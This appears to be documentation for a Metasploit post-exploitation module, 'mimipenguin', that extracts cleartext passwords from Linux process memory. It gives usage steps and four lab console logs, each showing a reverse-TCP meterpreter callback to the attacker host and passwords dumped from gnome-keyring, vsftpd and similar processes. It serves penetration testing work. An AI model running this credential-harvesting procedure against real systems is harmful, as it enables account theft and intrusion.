## Vulnerable Application

This finds cleartext passwords in process memory by first locating
needles that are known to be found nearby. 

This currently searches for passwords in `gnome-keyring-daemon`, `gdm-password`,
`vsftpd`, `ssh`, and `lightdm`.

## Verification Steps

1. Get a meterpreter session on a Linux-based target (with root privileges)
2. Do: `use post/linux/gather/mimipenguin`
3. Do: `set session <sess_no>`
4. Do: `run`
5. You should get credentials for the vulnerable services installed

## Options

## Scenarios

### Ubuntu 22.04 x64

```
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 192.168.140.1:4444
[*] Sending stage (3020772 bytes) to 192.168.140.140
[*] Meterpreter session 1 opened (192.168.140.1:4444 -> 192.168.140.140:35100 ) at 2022-06-22 13:11:24 -0500

meterpreter > getuid
Server username: root
meterpreter > sysinfo
Computer     : 192.168.140.140
OS           : Ubuntu 22.04 (Linux 5.15.0-37-generic)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
meterpreter > background
[*] Backgrounding session 1...
msf6 exploit(multi/handler) > use post/linux/gather/mimipenguin
msf6 post(linux/gather/mimipenguin) > set session 1
session => 1
msf6 post(linux/gather/mimipenguin) > run

[!] SESSION may not be compatible with this module:
[!]  * missing Meterpreter features: stdapi_railgun_api
[*] Checking for matches in process gnome-keyring-daemon
[*] Checking for matches in process gdm-password
[*] Checking for matches in process vsftpd
[*] Checking for matches in process sshd
[*] Checking for matches in process lightdm
[+] Found 1 valid credential(s)!

Credentials
===========

  Process Name          Username     Password
  ------------          --------     --------
  gnome-keyring-daemon  mimipenguin  M!mipenguinPass

[*] Credentials stored in /home/space/.msf4/loot/20220622131237_default_192.168.140.140_mimipenguin.csv_806145.txt
[*] Post module execution completed
```

### Ubuntu 21.04 x64

```
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 192.168.140.1:4444
[*] Sending stage (3020772 bytes) to 192.168.140.131
[*] Meterpreter session 2 opened (192.168.140.1:4444 -> 192.168.140.131:57524 ) at 2022-06-22 13:17:35 -0500

meterpreter > getuid
Server username: root
meterpreter > sysinfo
Computer     : 192.168.140.131
OS           : Ubuntu 21.04 (Linux 5.11.0-49-generic)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
meterpreter > background
[*] Backgrounding session 2...
msf6 exploit(multi/handler) > previous
msf6 post(linux/gather/mimipenguin) > set session 2
session => 2
msf6 post(linux/gather/mimipenguin) > run

[!] SESSION may not be compatible with this module:
[!]  * missing Meterpreter features: stdapi_railgun_api
[*] Checking for matches in process gnome-keyring-daemon
[*] Checking for matches in process gdm-password
[*] Checking for matches in process vsftpd
[*] Checking for matches in process sshd
[*] Checking for matches in process lightdm
[+] Found 2 valid credential(s)!

Credentials
===========

  Process Name          Username  Password
  ------------          --------  --------
  gnome-keyring-daemon  space     password
  vsftpd                jdoe      AccountF0rFTP

[*] Credentials stored in /home/space/.msf4/loot/20220622131938_default_192.168.140.131_mimipenguin.csv_269764.txt
[*] Post module execution completed
```

### Fedora 27 x64

```
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 192.168.140.1:4444
[*] Sending stage (3020772 bytes) to 192.168.140.165
[*] Meterpreter session 3 opened (192.168.140.1:4444 -> 192.168.140.165:39180 ) at 2022-06-22 13:23:26 -0500

meterpreter > background
[*] Backgrounding session 3...
msf6 exploit(multi/handler) > previous
msf6 post(linux/gather/mimipenguin) > set session 3
session => 3
msf6 post(linux/gather/mimipenguin) > run

[!] SESSION may not be compatible with this module:
[!]  * missing Meterpreter features: stdapi_railgun_api
[*] Checking for matches in process gnome-keyring-daemon
[*] Checking for matches in process gdm-password
[*] Checking for matches in process vsftpd
[*] Checking for matches in process sshd
[*] Checking for matches in process lightdm
[+] Found 2 valid credential(s)!

Credentials
===========

  Process Name          Username     Password
  ------------          --------     --------
  gnome-keyring-daemon  mimipenguin  M!mipenguinPass
  vsftpd                ftp_user     FTPP@ssword

[*] Credentials stored in /home/space/.msf4/loot/20220622132521_default_192.168.140.165_mimipenguin.csv_330546.txt
[*] Post module execution completed
```

### Ubuntu 14.04.1 x86

```
msf6 exploit(multi/handler) > set payload linux/x86/meterpreter/reverse_tcp
payload => linux/x86/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 192.168.140.1:4444
[*] Sending stage (989032 bytes) to 192.168.140.135
[*] Meterpreter session 4 opened (192.168.140.1:4444 -> 192.168.140.135:37070 ) at 2022-06-22 13:34:19 -0500

meterpreter > getuid
Server username: root
meterpreter > sysinfo
Computer     : 192.168.140.135
OS           : Ubuntu 14.04 (Linux 4.4.0-142-generic)
Architecture : i686
BuildTuple   : i486-linux-musl
Meterpreter  : x86/linux
meterpreter > background
[*] Backgrounding session 4...
msf6 exploit(multi/handler) > previous
msf6 post(linux/gather/mimipenguin) > set session 4
session => 4
msf6 post(linux/gather/mimipenguin) > run

[!] SESSION may not be compatible with this module:
[!]  * missing Meterpreter features: stdapi_railgun_api
[*] Checking for matches in process gnome-keyring-daemon
[*] Checking for matches in process gdm-password
[*] Checking for matches in process vsftpd
[*] Checking for matches in process sshd
[*] Checking for matches in process lightdm
[+] Found 2 valid credential(s)!

Credentials
===========

  Process Name          Username  Password
  ------------          --------  --------
  gnome-keyring-daemon  space     password
  gnome-keyring-daemon  test      RunningUpThatH!ll

[*] Credentials stored in /Users/space/.msf4/loot/20220622133502_default_192.168.140.135_mimipenguin.csv_117775.txt
[*] Post module execution completed
```
